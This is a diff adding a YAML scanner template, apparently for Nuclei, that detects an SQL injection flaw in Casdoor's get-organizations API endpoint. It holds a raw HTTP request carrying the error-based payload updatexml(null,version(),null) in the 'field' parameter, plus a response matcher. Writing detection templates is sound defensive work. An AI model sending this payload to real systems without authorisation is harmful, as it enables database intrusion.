@@ -1,0 +1,22 @@
+id: casdoor-get-organizations-sqli
+
+info:
+  name: casdoor-get-organizations-sqli
+  author: xiaokp7
+  severity: critical
+  description: casdoor get-organizations存在SQL注入漏洞
+
+http:
+  - raw:
+    - |
+      GET /api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(null,version(),null) HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"XPATH syntaxn")'
